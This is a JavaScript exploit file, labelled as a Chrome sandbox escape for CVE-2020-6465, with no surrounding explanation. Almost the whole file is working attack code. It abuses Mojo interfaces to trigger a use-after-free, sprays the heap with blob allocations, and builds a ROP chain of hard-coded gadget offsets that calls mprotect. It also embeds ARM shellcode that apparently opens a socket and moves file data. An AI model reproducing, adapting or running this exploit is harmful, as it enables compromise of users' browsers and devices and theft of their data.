
/*

Here is the SBX Exploit(CVE-2020-6465)

*/

function allocateLFH_Win(src) {
    var iframe = document.createElement("iframe");
    iframe.src = src;
    document.body.appendChild(iframe);
    return iframe;
  }
  
  function freeLFH_Win(iframe) {
    document.body.removeChild(iframe);
  }
  
  function sendPtr() {
    var pipe = Mojo.createMessagePipe();
    Mojo.bindInterface(domDistiller.mojom.DistillerJavaScriptService.name, pipe.handle1, "context", true)
    Mojo.bindInterface("PWN", pipe.handle0, "process");
  }
  
  function getFreedPtr() {
    // let allocate = getAllocationConstructor();
    return new Promise(function (resolve, reject) {
      var frame = allocateRFH(window.location.href + "#child");
      let interceptor = new MojoInterfaceInterceptor("PWN", "process");
      interceptor.oninterfacerequest = function (e) {
        interceptor.stop();
        let provider_ptr = new domDistiller.mojom.DistillerJavaScriptServicePtr(e.handle);
        freeRFH(frame);
  
        resolve(provider_ptr);
      }
      interceptor.start();
    });
  }
  
  function getAllocationConstructor() {
    let blob_registry_ptr = new blink.mojom.BlobRegistryPtr();
    Mojo.bindInterface(blink.mojom.BlobRegistry.name,
      mojo.makeRequest(blob_registry_ptr).handle, "process", true);
  
    function Allocation(size=280) {
      function ProgressClient(allocate) {
        function ProgressClientImpl() {
        }
        ProgressClientImpl.prototype = {
          onProgress: async (arg0) => {
            if (this.allocate.writePromise) {
              this.allocate.writePromise.resolve(arg0);
            }
          }
        };
        this.allocate = allocate;
  
        this.ptr = new mojo.AssociatedInterfacePtrInfo();
        var progress_client_req = mojo.makeRequest(this.ptr);
        this.binding = new mojo.AssociatedBinding(
          blink.mojom.ProgressClient, new ProgressClientImpl(), progress_client_req
        );
  
        return this;
      }
  
      this.pipe = Mojo.createDataPipe({elementNumBytes: size, capacityNumBytes: size});
      this.progressClient = new ProgressClient(this);
      blob_registry_ptr.registerFromStream("", "", size, this.pipe.consumer, this.progressClient.ptr).then((res) => {
        this.serialized_blob = res.blob;
      })
  
      this.malloc = async function(data) {
        promise = new Promise((resolve, reject) => {
          this.writePromise = {resolve: resolve, reject: reject};
        });
        this.pipe.producer.writeData(data);
        this.pipe.producer.close();
        written = await promise;
        console.assert(written == data.byteLength);
      }
  
      this.free = async function() {
        this.serialized_blob.blob.ptr.reset();
        await sleep(1000);
      }
  
      this.read = function(offset, length) {
        this.readpipe = Mojo.createDataPipe({elementNumBytes: 1, capacityNumBytes: length});
        this.serialized_blob.blob.readRange(offset, length, this.readpipe.producer, null);
        return new Promise((resolve) => {
          this.watcher = this.readpipe.consumer.watch({readable: true}, (r) => {
            result = new ArrayBuffer(length);
            this.readpipe.consumer.readData(result);
            this.watcher.cancel();
            resolve(result);
          });
        });
      }
  
      this.readQword = async function(offset) {
        let res = await this.read(offset, 8);
        return (new DataView(res)).getBigUint64(0, true);
      }
  
      return this;
    }
  
    async function allocate(data) {
      let allocation = new Allocation(data.byteLength);
      await allocation.malloc(data);
      return allocation;
    }
    return allocate;
  }
  
  function spray(data, num) {
    return Promise.all(Array(num).fill().map(() => allocate(data)));
  }
  
  function strcpy(ab, str) {
      var view = new DataView(ab);
      for (var i = 0; i < str.length; i++) {
          view.setUint8(i, str.charCodeAt(i));
      }
  }
  
  async function trigger(oob) {
    if (window.location.hash == "#child") {
      print("send")
      sendPtr();
      return;
    }
    print("trigger");
  
  
    let allocate = getAllocationConstructor();
    let ptr2 = new blink.mojom.PeerConnectionTrackerHostPtr();
    Mojo.bindInterface(blink.mojom.PeerConnectionTrackerHost.name, mojo.makeRequest(ptr2).handle, "process");
  
    let size = 0x30000;
    let ab = new ArrayBuffer(size);
      let view = new DataView(ab);
  
    /*
    (gdb) x/30wx 0xcaf0c000
    0xcaf0c000:	0xbe006000	0xd0353488	0xd0353490	0xd0352afc
    0xcaf0c010:	0xbe006000	0xd0353488	0xd0353490	0xd0352afc
    0xcaf0c020:	0xbe006000	0xd0353488	0xd0353490	0xd0352afc
    0xcaf0c030:	0xbe006000	0xd0353488	0xd0353490	0xd0352afc
    0xcaf0c040:	0xbe006000	0xd0353488	0xd0353490	0xd0352afc
    0xcaf0c050:	0xbe006000	0xd0353488	0xd0353490	0xd0352afc
    0xcaf0c060:	0xbe006000	0xd0353488	0xd0353490	0xd0352afc
    */
  
    let heap = 0xbcf8c000;
    print(heap.toString(16));
  
    var base = oob.chrome_child_base;//parseInt(prompt("base"), 16);
    // 0xbc403380
  
    read_ptr = oob.getUint32_2(base+0x0309C074);
    var libc = read_ptr-0x1d5ad;//oob.libc;
  
    let mprotect = libc + 0x4abdc;
  
  // mov sp, r0 ; add sp, sp, #4 ; pop {r4, r5, r6, r7, r8, sb, sl, fp, ip, lr} ; add sp, sp, #8 ; mov r0, #1 ; bx lr
  let gadget1 = base + 0x6782a8
  // pop {r4, r5, r6, r7, r8, sb, sl, fp, ip, lr} ; add sp, sp, #8 ; mov r0, #1 ; bx lr
  let gadget2 = base + 0x6782b0
  // pop {r4, pc}
  let gadget3 = base + 0x67791c
  // pop {r4, r5, pc}
  let gadget4 = base + 0x7bf918
  // pop {r0, pc}
  let gadget5 = base + 0x8cf14c
  // pop {r1, pc}
  let gadget6 = base + 0x7d72bc
  // pop {r2, pc}
  let gadget7 = base + 0x9468ec
  // bx r4
  let gadget8 = base + 0x691754
  // pop {lr, pc}
  let gadget9 = base + 0xce08c8
  
  
  
    var cnt = 0;
      for (var i = 0; i < 0x4000;) {
      var idx = parseInt(i / 0x1000) % 0x4;
      switch (idx) {
        case 0:
          view.setUint32(i, heap+0x2000, true);
          view.setUint32(i+4, gadget1, true);
          view.setUint32(i+8, gadget2, true);
          view.setUint32(i+12, gadget3, true);
          i += 16;
          break;
        case 1: // gadget
          var pay = [];
          pay.push(gadget5);
          pay.push(heap + 0x3000);
          pay.push(gadget6);
          pay.push(0x1000);
          pay.push(gadget7);
          pay.push(7);
          pay.push(gadget9);
          pay.push(heap + 0x3000);
          pay.push(mprotect);
          pay.push(0x41414141)
  
          for (var j = 0; j < pay.length; j ++) {
            view.setUint32((i + 0x1000 - pay.length * 4) + (j * 4), pay[j], true); 
          }
  
          for (var j = 0; j < (0x1000 - pay.length * 4); j+=8) {
            view.setUint32(i + j, gadget3, true);
            view.setUint32(i + j + 4, gadget4, true);
          }
          i += 0x1000;
          break;
        case 2: // first pc 
          view.setUint32(i, gadget1, true);
          i += 4;
          break;
        case 3: // shellcode
          var sc = [0xe1a0800f,0xe28880ff,0xe28880ff,0xe28880ff,0xe28880ff,0xe3a00002,0xe3a01001,0xe0222002,0xe3007119,0xef000000,0xe1a06000,0xe30f7e81,0xe3427bf6,0xe52d7004,0xe3007002,0xe3457c11,0xe52d7004,0xe1a00006,0xe1a0100d,0xe3a02010,0xe300711b,0xef000000,0xe3047100,0xe3447141,0xe52d7004,0xe306796b,0xe3477365,0xe52d7004,0xe304732f,0xe3467f6f,0xe52d7004,0xe3077561,0xe347746c,0xe52d7004,0xe304742f,0xe3467665,0xe52d7004,0xe3067f72,0xe346756d,0xe52d7004,0xe3057f70,0xe3467863,0xe52d7004,0xe3027f65,0xe3477061,0xe52d7004,0xe3077268,0xe3467d6f,0xe52d7004,0xe3067469,0xe346732e,0xe52d7004,0xe306746e,0xe3467f72,0xe52d7004,0xe3067d6f,0xe346712e,0xe52d7004,0xe3067174,0xe346732f,0xe52d7004,0xe3027f61,0xe3467164,0xe52d7004,0xe306742f,0xe3477461,0xe52d7004,0xe1a0000d,0xe0211001,0xe0222002,0xe3a07005,0xef000000,0xe1a01008,0xe3a02801,0xe3a07003,0xef000000,0xe1a00006,0xe1a01008,0xe3a02801,0xe3a07004,0xef000000];
          for (var j = 0; j < sc.length; j++) {
            view.setUint32((i + 0x1000 - sc.length * 4) + (j * 4), sc[j], true);
          }
  
          for (var j = 0; j < (0x1000 - sc.length * 4); j += 4) {
            view.setUint32(i + j, 0xe320f000, true); // nop
          }
          i += 0x1000;
          break;
      } 
      cnt += 1;
      }
  
    var view2 = new Uint8Array(ab);
    for (var i = 1; i < (size/0x4000); i++) {
      view2.set(new Uint8Array(ab).slice(0, 0x4000), 0x4000 * i);
      print(i);
    }
  
    var size2 = 0x100;
    print(size2);
    let chunks = new Array(size2);
    for (var i = 0; i < size2; i++){
      chunks[i] = await allocate(ab);
    }
    print("done");
  
    var target = [];
    target.push(heap%0x100);
    target.push((heap/0x100)%0x100);
    target.push((heap/0x10000)%0x100);
    target.push((heap/0x1000000)%0x100);
  
  
    let ptr = await getFreedPtr();
  
    var arr = [];
    for ( var i = 0; i < (0x828 / 4); i++) {
      arr = arr.concat(target);
    }
    ptr2.webRtcEventLogWrite(1, arr);
    ptr.handleDistillerOpenSettingsCall();
  
  }